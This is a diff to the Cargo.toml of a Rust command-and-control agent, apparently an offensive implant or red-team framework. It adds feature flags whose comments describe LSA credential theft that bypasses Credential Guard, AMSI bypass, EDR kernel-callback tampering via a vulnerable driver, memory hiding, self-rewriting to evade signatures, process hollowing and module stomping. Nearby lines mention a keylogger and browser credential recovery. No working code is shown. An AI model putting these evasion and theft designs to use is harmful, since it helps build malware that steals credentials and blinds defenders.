@@ -60,7 +60,7 @@ aes-gcm = "0.10"
 aes = "0.9.0"
 ctr = "0.10.0"
 async-trait = "0.1.89"
-winapi = { version = "0.3", features = ["ntdef", "psapi", "threadpoolapiset", "threadpoollegacyapiset", "memoryapi", "winnt"] }
+winapi = { version = "0.3", features = ["ntdef", "psapi", "threadpoolapiset", "threadpoollegacyapiset", "memoryapi", "winnt", "ntsecapi", "sspi"] }
 russh = { version = "0.46", optional = true }
 russh-keys = { version = "0.46", optional = true }
 notify = { version = "6.1", optional = true }
@@ -153,7 +153,12 @@ http-transport = []
 # Browser stored-data recovery: Chrome (including App-Bound Encryption v127+),
 # Edge, and Firefox.  Windows-only.  No extra crate dependencies beyond what is
 # already in the agent dependency tree.
-browser-data = []# Surveillance capabilities: screenshot capture (multi-monitor), keylogger
+browser-data = []
+# LSA Whisperer — credential extraction via LSA SSP interfaces.
+# Interacts with LSA authentication packages through documented interfaces,
+# operating within the LSA process's own security context.  Bypasses Credential
+# Guard and RunAsPPL.  Windows-only.  No extra crate dependencies.
+lsa-whisperer = []# Surveillance capabilities: screenshot capture (multi-monitor), keylogger
 # (WH_KEYBOARD_LL with encrypted buffer), and clipboard monitoring (polling
 # thread with encrypted buffer).  Pulls in `dep:image` for PNG encoding.
 surveillance = ["dep:image"]# Activate the SSH covert transport (c2_ssh::SshTransport).
@@ -176,10 +181,57 @@ smb-pipe-transport = []
 # similar mitigations.  Default (without this feature) is the memory-patch
 # approach from amsi_defense.rs, which leaves no environment-variable trace.
 hwbp-amsi = []
+# AMSI Write-Raid bypass: spawns a race thread that continuously overwrites the
+# AmsiInitFailed flag in amsi.dll's .data section, causing all subsequent
+# AmsiScanBuffer calls to return AMSI_RESULT_CLEAN without code patching.
+# Zero VirtualProtect calls, zero .text modifications, zero hardware
+# breakpoints.  Most stealthy AMSI bypass available.
+write-raid-amsi = []
+# Continuous memory hiding ("Evanesco"): keeps all pages NOT actively being
+# executed in an encrypted/PAGE_NOACCESS state at ALL times, not just during
+# sleep.  Per-page RC4 encryption with a background re-encryption thread,
+# VEH-based auto-decryption, and RAII PageGuard for JIT access.  Works as an
+# additional layer alongside the existing XChaCha20-Poly1305 sleep encryption.
+# Windows-only (uses NtProtectVirtualMemory, VEH).
+evanesco = []
+# Kernel callback overwrite (BYOVD): surgically overwrite EDR kernel callback
+# function pointers to point to a `ret` instruction instead of NULLing them.
+# Defeats EDR self-integrity checks (CrowdStrike, Defender) that verify their
+# callbacks are still registered by checking if the pointer is non-NULL.
+# A ret pointer passes these checks (non-NULL, valid executable memory) but
+# causes the callback to immediately return without executing any monitoring
+# logic.  Requires (and implies) `direct-syscalls`.  Windows-only.
+kernel-callback = ["direct-syscalls"]
 # Self-re-encoding ("Metamorphic Lite"): periodically re-encode the agent's own
 # .text section at runtime using the code_transform pipeline with a fresh seed
 # derived from a C2-supplied nonce and the current timestamp.
 self-reencode = ["dep:code_transform", "dep:goblin"]
+# Automated EDR bypass transformation engine: scans the agent's own .text
+# section for byte signatures known to be detected by EDR (YARA rules, entropy
+# heuristics, known gadget chains like "4C 8B D1 B8" for direct syscall stubs).
+# When a detected pattern is found, applies semantic-preserving transformations
+# automatically at runtime: instruction substitution, register reassignment,
+# nop sled insertion with semantic-equivalent nops, constant splitting, and
+# jump obfuscation.  Supplements self-reencoding (handles PATTERN AVOIDANCE
+# before and after morphing).  Requires (and implies) `self-reencode`.
+evasion-transform = ["self-reencode"]
+# NTFS transaction-based process hollowing: creates an NTFS transaction via
+# NtCreateTransaction, creates a section backed by the transaction, writes
+# payload into a suspended target process, then rolls back the transaction
+# so the file on disk never existed.  The section mapping in the target
+# process remains valid.  Includes ETW blinding with spoofed provider GUIDs.
+# Falls back to RtlCreateTransaction via kernel32 ordinal if NtCreateTransaction
+# SSN is unavailable.  Requires (and implies) `direct-syscalls`.  Windows-only.
+transacted-hollowing = ["direct-syscalls"]
+
+# Delayed module-stomp injection: loads a sacrificial DLL into the target
+# process, waits for a configurable delay (default 8–15 seconds randomized)
+# to let EDR initial-scan heuristics pass, then overwrites the DLL's .text
+# section with the payload.  Defeats timing-based EDR heuristics that flag
+# modules whose code changes shortly after loading.  Two-phase: Phase 1 loads
+# the DLL and returns immediately; Phase 2 stomps and executes after delay.
+# Requires (and implies) `direct-syscalls`.  Windows-only.
+delayed-stomp = ["direct-syscalls"]
 
 [[bin]]
 name = "agent-standalone"
